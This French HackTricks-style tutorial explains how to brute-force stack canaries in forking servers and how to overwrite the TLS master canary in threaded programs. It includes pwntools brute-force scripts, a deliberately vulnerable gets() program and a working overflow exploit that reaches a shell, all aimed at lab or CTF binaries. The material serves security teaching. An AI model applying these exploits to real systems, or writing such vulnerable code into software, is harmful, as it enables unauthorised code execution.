# BF Forked & Threaded Stack Canaries

{{#include ../../../../banners/hacktricks-training.md}}

**Si vous êtes confronté à un binaire protégé par un canary et un PIE (Position Independent Executable), vous devez probablement trouver un moyen de les contourner.**

![](<../../../../images/image (144).png>)

> [!NOTE]
> Notez que **`checksec`** pourrait ne pas détecter qu'un binaire est protégé par un canary si celui-ci a été compilé statiquement et qu'il n'est pas capable d'identifier la fonction.\
> Cependant, vous pouvez le remarquer manuellement si vous constatez qu'une valeur est enregistrée dans la pile au début d'un appel de fonction et que cette valeur est vérifiée avant la sortie.

## Brute force Canary

Le meilleur moyen de contourner un canary simple est si le binaire est un programme **créant des processus enfants chaque fois que vous établissez une nouvelle connexion** avec lui (service réseau), car chaque fois que vous vous y connectez, **le même canary sera utilisé**.

Ensuite, le meilleur moyen de contourner le canary est simplement de **le brute-forcer caractère par caractère**, et vous pouvez déterminer si le byte de canary deviné était correct en vérifiant si le programme a planté ou continue son flux régulier. Dans cet exemple, la fonction **brute-force un canary de 8 octets (x64)** et distingue entre un byte deviné correctement et un mauvais byte juste en **vérifiant** si une **réponse** est renvoyée par le serveur (une autre méthode dans **d'autres situations** pourrait être d'utiliser un **try/except**):

### Exemple 1

Cet exemple est implémenté pour 64 bits mais pourrait être facilement implémenté pour 32 bits.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Exemple 2

Ceci est implémenté pour 32 bits, mais cela pourrait être facilement changé en 64 bits.\
Notez également que pour cet exemple, le **programme s'attend d'abord à un octet pour indiquer la taille de l'entrée** et le payload.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Threads

Les threads du même processus **partageront le même jeton canari**, il sera donc possible de **brute-forcer** un canari si le binaire crée un nouveau thread chaque fois qu'une attaque se produit.&#x20;

Un débordement de tampon dans une fonction multithreadée protégée par un canari peut être utilisé pour modifier le canari maître du processus. En conséquence, l'atténuation est inutile car la vérification est effectuée avec deux canaris qui sont identiques (bien que modifiés).

### Example

Le programme suivant est vulnérable au débordement de tampon, mais il est compilé avec un canari :
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Remarquez que `vuln` est appelé à l'intérieur d'un thread. Dans GDB, nous pouvons examiner `vuln`, en particulier, au point où le programme appelle `gets` pour lire les données d'entrée :
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
L'adresse ci-dessus représente l'adresse de `data`, où le programme écrira l'entrée de l'utilisateur. Le stack canary se trouve à `0x7ffff7d7ee48` (`0x493fdc653a156800`), et l'adresse de retour est à `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`) :
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Remarquez que les adresses de la pile n'appartiennent pas à la pile réelle :
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
La pile du thread est placée au-dessus du stockage local du thread (TLS), où le canari maître est stocké :
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
> [!NOTE]
> Certaines des fonctions GDB ci-dessus sont définies dans une extension appelée [bata24/gef](https://github.com/bata24/gef), qui a plus de fonctionnalités que le [hugsy/gef](https://github.com/hugsy/gef).

En conséquence, un grand Buffer Overflow peut permettre de modifier à la fois le stack canary et le master canary dans le TLS. Voici le décalage :
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Ceci est un court exploit pour appeler `win` :
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Autres exemples et références

- [https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html](https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html)
- 64 bits, pas de PIE, nx, BF canary, écrire dans une mémoire un ROP pour appeler `execve` et sauter là.
- [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
- 64 bits, pas de PIE, nx, modifier le thread et le canary maître.
